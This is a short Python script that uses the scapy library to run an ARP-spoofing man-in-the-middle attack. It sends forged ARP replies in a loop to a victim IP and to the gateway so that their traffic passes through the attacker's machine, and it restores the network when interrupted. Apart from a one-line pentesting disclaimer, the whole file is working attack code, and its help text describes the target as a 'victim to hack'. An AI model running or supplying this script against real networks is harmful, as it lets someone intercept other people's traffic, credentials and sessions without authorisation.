#----By--Mugiw4r4------
#----DISCLAIMER---only-use-it-for-pentesting-purposes---Do-no-use-it-for-evil-ones

#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time

def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-v','--victim',dest='victim',help='IP of the target victim to hack')
    parser.add_argument('-g', '--gateway',dest='gateway',help='IP of the router')
    return parser.parse_args()

def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast/arp_req
    answered = scapy.srp(arp_req_broadcast, timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    arp_resp=scapy.ARP(pdst=target_ip,op=2,hwdst=get_mac(target_ip),psrc=spoof_ip)
    scapy.send(arp_resp,verbose=False)

def restore_net(dest_ip,src_ip):
    arp_resp=scapy.ARP(op=2,pdst=dest_ip,hwdst=get_mac(dest_ip),psrc=src_ip,hwsrc=get_mac(src_ip))
    scapy.send(arp_resp,verbose=False)

args=get_args()
counter=0
try:
    while True:
        spoof(args.victim,args.gateway)
        spoof(args.gateway,args.victim)
        counter+=2
        print('\r[+] Sent ' + str(counter) + ' spoofing packets',end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n'+'[+] Oups , You have pressed Ctrl+C and thus canceled the spoofing ....\n just wait until we restore the network back to normal ..... ')
    restore_net(args.victim,args.gateway)
    restore_net(args.gateway,args.victim)
    print('[+] Done , good bye my friend !')


